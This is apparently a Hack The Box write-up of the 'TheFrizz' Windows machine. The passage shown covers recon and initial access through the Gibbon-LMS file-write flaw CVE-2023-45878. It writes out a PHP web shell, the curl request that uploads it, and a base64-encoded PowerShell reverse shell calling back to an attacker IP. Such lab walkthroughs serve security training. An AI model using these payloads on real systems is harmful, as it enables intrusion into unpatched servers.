---
title: "TheFrizz"
date: 2026-02-10
categories: [HTB]
tags: [windows, active-directory]
toc: true

image:
  path: /assets/img/htb/thefrizz/thefrizzmain.png
  alt: "TheFrizz"
---

TheFrizz is a retired Windows Server 2022 Active Directory box that chains a vulnerable Gibbon-LMS file upload (CVE-2023-45878) to gain a web shell, harvest database credentials, pivot into AD with Kerberos authentication, and abuse GPO permissions to escalate from a low-privileged user to Domain Administrator.

---

## Recon
### Nmap — Port Discovery
Begin with a full TCP sweep to identify all open ports on the target.

`sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`
![](/assets/img/htb/thefrizz/thefrizz1.png)

Parse the results to store all open ports in a variable for follow-up scanning.

`ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`
![](/assets/img/htb/thefrizz/thefrizz5.png)

---

### Nmap — Service Enumeration
Run a targeted service and script scan against only the discovered open ports.

`sudo nmap -p $ports -sC -sV -Pn --min-rate 500 10.129.232.168 -oN scans/service_enum.txt`
![](/assets/img/htb/thefrizz/thefrizz2.png)

---

### DNS/Host Resolution
After the Nmap scan revealed the domain frizz.htb, I added it to /etc/hosts to enable proper name resolution. When the web page on port 80 failed to load correctly, I observed it was redirecting to frizzdc.frizz.htb, so I added this hostname as well.

![](assets/img/htb/thefrizz/thefrizz3.png)
`echo '10.129.18.74 thefrizz.htb' | sudo tee -a /etc/hosts`
![](assets/img/htb/thefrizz/thefrizz4.png)
`echo '10.129.232.168 frizzdc.frizz.htb' | sudo tee -a /etc/hosts`

---

## SMB 445, 139
Checked smb via `nxc`. Null session does not work, will move on until I get some creds.
`nxc smb 10.129.232.168`
![](assets/img/htb/thefrizz/thefrizz9.png)

---

## Web Enumeration (Port 80)
### Initial Access to the Web App
Browising to port 80 presents a public “Walker­ville Elementary School” site with a Staff Login link, which led to a Gibbon-LMS instance.
![](assets/img/htb/thefrizz/thefrizz6.png)
![](assets/img/htb/thefrizz/thefrizz7.png)

---

### Directory Brute Force
Ran `gobuster` against the Gibbon-LMS application for anything interesting.
![](assets/img/htb/thefrizz/thefrizz8.png)

---

## Initial Access (Web → Shell)

### CVE-2023-45878 — Gibbon-LMS Arbitrary File Write  

#### Payload

I created a minimal PHP webshell:

`echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`

Because the endpoint expects base64 data, I encoded the file:

`b64=$(base64 -w0 shell.php)`
![](assets/img/htb/thefrizz/thefrizz12.png)

#### Upload the webshell

I then abused the vulnerable endpoint to write the file to the server. gibbonPersonID is needed.

`curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d "img=image/png;asdf,${b64}" -d "path=shell.php" -d "gibbonPersonID=0000000001"`
![](assets/img/htb/thefrizz/thefrizz14.png)

What each parameter does:

`img=image/png;asdf,${b64}`  
  The server splits on the comma, base64-decodes everything on the right, and writes it to disk.  
  The `image/png;asdf` portion is just filler to satisfy the parser.
  
`path=shell.php`  
  Controls the output filename. Because extensions are not restricted, I can choose `.php`.
  
`gibbonPersonID=0000000001`  
  A required application field that influences where the file is saved.

If the upload succeeds, the endpoint echoes the filename back:

`shell.php%`

#### Verify remote code execution

I accessed the uploaded shell directly:

`curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=whoami"`
![](assets/img/htb/thefrizz/thefrizz13.png)
`frizz\w.webservice`

This confirms remote command execution on the web server.

I then used a revshell powershell oneliner.

`curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
![](assets/img/htb/thefrizz/thefrizz16.png)

This reulsts in a shell as w.webservice
![](assets/img/htb/thefrizz/thefrizz17.png)
